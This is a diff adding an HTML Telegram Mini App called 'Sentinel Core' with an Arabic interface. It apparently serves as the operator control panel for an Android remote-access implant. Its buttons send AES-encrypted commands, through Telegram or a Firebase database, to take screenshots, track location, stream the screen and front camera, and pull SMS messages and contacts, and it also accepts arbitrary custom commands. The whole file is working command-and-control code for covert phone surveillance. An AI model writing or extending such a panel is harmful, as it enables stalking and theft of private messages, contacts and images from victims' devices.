@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sentinel Mini App</title>
+    <!-- استدعاء Tailwind CSS لسرعة وجمالية التصميم -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- مكتبة التشفير -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <!-- مكتبة تليجرام ويب آب -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body { background-color: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        .glass-panel { background: rgba(22, 27, 34, 0.8); backdrop-filter: blur(10px); border: 1px solid #30363d; }
+        .btn-action { transition: all 0.2s ease-in-out; }
+        .btn-action:active { transform: scale(0.95); }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center p-4">
+
+    <!-- Header -->
+    <div class="w-full max-w-md flex justify-between items-center mb-6">
+        <h1 class="text-xl font-bold text-green-400">🛡️ Sentinel Core</h1>
+        <button onclick="openSettings()" class="text-gray-400 hover:text-white">⚙️ إعدادات</button>
+    </div>
+
+    <!-- Main Grid -->
+    <div class="w-full max-w-md grid grid-cols-2 gap-4 mb-6">
+        <button onclick="sendCommand('/screen')" class="btn-action glass-panel rounded-xl p-4 flex flex-col items-center justify-center text-center">
+            <span class="text-2xl mb-2">📸</span>
+            <span class="text-sm font-semibold">لقطة شاشة</span>
+        </button>
+        <button onclick="sendCommand('/location')" class="btn-action glass-panel rounded-xl p-4 flex flex-col items-center justify-center text-center">
+            <span class="text-2xl mb-2">📍</span>
+            <span class="text-sm font-semibold">الموقع</span>
+        </button>
+        <button onclick="sendCommand('/live')" class="btn-action glass-panel rounded-xl p-4 flex flex-col items-center justify-center text-center">
+            <span class="text-2xl mb-2">📱</span>
+            <span class="text-sm font-semibold">بث الشاشة</span>
+        </button>
+        <button onclick="sendCommand('/livecam front')" class="btn-action glass-panel rounded-xl p-4 flex flex-col items-center justify-center text-center">
+            <span class="text-2xl mb-2">🔴</span>
+            <span class="text-sm font-semibold">بث كاميرا أمامية</span>
+        </button>
+        <button onclick="sendCommand('/sms')" class="btn-action glass-panel rounded-xl p-4 flex flex-col items-center justify-center text-center">
+            <span class="text-2xl mb-2">💬</span>
+            <span class="text-sm font-semibold">سحب الرسائل</span>
+        </button>
+        <button onclick="sendCommand('/contacts')" class="btn-action glass-panel rounded-xl p-4 flex flex-col items-center justify-center text-center">
+            <span class="text-2xl mb-2">👥</span>
+            <span class="text-sm font-semibold">سحب جهات الاتصال</span>
+        </button>
+    </div>
+
+    <!-- Custom Command Input -->
+    <div class="w-full max-w-md glass-panel rounded-xl p-4 flex gap-2">
+        <input type="text" id="customCmd" placeholder="أدخل أمراً مخصصاً (مثال: /info)" class="flex-1 bg-transparent border border-gray-600 rounded px-3 py-2 text-white focus:outline-none focus:border-green-400">
+        <button onclick="sendCustomCommand()" class="bg-green-600 hover:bg-green-500 text-white font-bold py-2 px-4 rounded btn-action">إرسال</button>
+    </div>
+
+    <!-- Settings Modal (Hidden by default) -->
+    <div id="settingsModal" class="fixed inset-0 bg-black bg-opacity-80 flex justify-center items-center hidden z-50 p-4">
+        <div class="glass-panel w-full max-w-md rounded-xl p-6 shadow-2xl">
+            <h2 class="text-lg font-bold mb-4 text-white">⚙️ إعدادات التشفير والاتصال</h2>
+            <div class="mb-4">
+                <label class="block text-sm text-gray-400 mb-1">مفتاح التشفير (AES Key)</label>
+                <input type="text" id="aesKey" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white focus:outline-none focus:border-blue-400">
+            </div>
+            <div class="mb-4">
+                <label class="block text-sm text-gray-400 mb-1">وضع الاتصال</label>
+                <select id="connMode" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white focus:outline-none">
+                    <option value="telegram">Telegram WebApp (توصية)</option>
+                    <option value="firebase">Firebase REST API</option>
+                </select>
+            </div>
+            <!-- إعدادات فايربيز تظهر فقط إذا تم اختياره -->
+            <div id="fbSettings" class="hidden">
+                <div class="mb-4">
+                    <label class="block text-sm text-gray-400 mb-1">رابط قاعدة البيانات (Firebase URL)</label>
+                    <input type="text" id="fbUrl" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white placeholder-gray-600" placeholder="https://your-app.firebaseio.com">
+                </div>
+                <div class="mb-4">
+                    <label class="block text-sm text-gray-400 mb-1">الرقم السري لقاعدة البيانات (Database Secret)</label>
+                    <input type="text" id="fbSecret" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white">
+                </div>
+            </div>
+            <div class="flex justify-end gap-2 mt-6">
+                <button onclick="closeSettings()" class="px-4 py-2 rounded border border-gray-600 hover:bg-gray-800 transition">إلغاء</button>
+                <button onclick="saveSettings()" class="px-4 py-2 rounded bg-blue-600 hover:bg-blue-500 text-white font-bold transition">حفظ</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notification Toast -->
+    <div id="toast" class="fixed bottom-10 bg-green-600 text-white px-6 py-2 rounded-full shadow-lg opacity-0 transition-opacity duration-300 pointer-events-none">
+        تم الإرسال بنجاح
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand(); // توسيع الواجهة في تليجرام
+
+        // التحكم في ظهور وإخفاء حقول فايربيز بناء على الوضع
+        document.getElementById('connMode').addEventListener('change', function(e) {
+            document.getElementById('fbSettings').style.display = e.target.value === 'firebase' ? 'block' : 'none';
+        });
+
+        // دالة التشفير المطابقة للأندرويد (AES/CBC/PKCS5Padding)
+        function encryptAES(plainText, secretKeyStr) {
+            try {
+                const key = CryptoJS.enc.Utf8.parse(secretKeyStr);
+                const iv = CryptoJS.lib.WordArray.random(16);
+                const encrypted = CryptoJS.AES.encrypt(plainText, key, {
+                    iv: iv,
+                    mode: CryptoJS.mode.CBC,
+                    padding: CryptoJS.pad.Pkcs7
+                });
+                const combined = iv.clone().concat(encrypted.ciphertext);
+                return CryptoJS.enc.Base64.stringify(combined);
+            } catch (error) {
+                alert("خطأ في التشفير: تأكد من أن مفتاح التشفير صحيح.");
+                return null;
+            }
+        }
+
+        // إرسال الأمر
+        function sendCommand(cmd) {
+            const aesKey = localStorage.getItem('aesKey');
+            const mode = localStorage.getItem('connMode') || 'telegram';
+
+            if (!aesKey) {
+                openSettings();
+                return;
+            }
+
+            const encryptedData = encryptAES(cmd, aesKey);
+            if (!encryptedData) return;
+
+            if (mode === 'telegram') {
+                // الطريقة الأولى المستقلة (عبر تليجرام)
+                tg.sendData(encryptedData);
+                showToast("تم إرسال الأمر المشفر عبر Telegram");
+                setTimeout(() => tg.close(), 500); // إغلاق الواجهة بعد الإرسال
+            } else {
+                // الطريقة الثانية (عبر فايربيز)
+                const fbUrl = localStorage.getItem('fbUrl');
+                const fbSecret = localStorage.getItem('fbSecret');
+                if (!fbUrl || !fbSecret) {
+                    alert("إعدادات فايربيز مفقودة.");
+                    openSettings();
+                    return;
+                }
+
+                const payload = {
+                    cmd: encryptedData,
+                    status: "pending",
+                    reply_to: "TELEGRAM"
+                };
+
+                const fullUrl = `${fbUrl}/current_command.json?auth=${fbSecret}`;
+                fetch(fullUrl, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).then(res => {
+                    if(res.ok) {
+                        showToast("تم إرسال الأمر المشفر للسحابة (Firebase)");
+                    } else {
+                        alert("فشل الإرسال للسحابة.");
+                    }
+                }).catch(err => alert("خطأ في الاتصال: " + err));
+            }
+        }
+
+        function sendCustomCommand() {
+            const cmd = document.getElementById('customCmd').value;
+            if(cmd.trim() !== '') sendCommand(cmd);
+        }
+
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            toast.innerText = msg;
+            toast.classList.remove('opacity-0');
+            toast.classList.add('opacity-100');
+            setTimeout(() => {
+                toast.classList.remove('opacity-100');
+                toast.classList.add('opacity-0');
+            }, 2500);
+        }
+
+        function openSettings() {
+            document.getElementById('aesKey').value = localStorage.getItem('aesKey') || '';
+            document.getElementById('connMode').value = localStorage.getItem('connMode') || 'telegram';
+            document.getElementById('fbUrl').value = localStorage.getItem('fbUrl') || '';
+            document.getElementById('fbSecret').value = localStorage.getItem('fbSecret') || '';
+            document.getElementById('connMode').dispatchEvent(new Event('change'));
+            document.getElementById('settingsModal').classList.remove('hidden');
+        }
+
+        function closeSettings() {
+            document.getElementById('settingsModal').classList.add('hidden');
+        }
+
+        function saveSettings() {
+            localStorage.setItem('aesKey', document.getElementById('aesKey').value);
+            localStorage.setItem('connMode', document.getElementById('connMode').value);
+            localStorage.setItem('fbUrl', document.getElementById('fbUrl').value);
+            localStorage.setItem('fbSecret', document.getElementById('fbSecret').value);
+            closeSettings();
+            showToast("تم حفظ الإعدادات بأمان محلياً");
+        }
+
+        // إجبار المستخدم على إدخال الإعدادات أول مرة
+        if (!localStorage.getItem('aesKey')) {
+            openSettings();
+        }
+    </script>
+</body>
+</html>
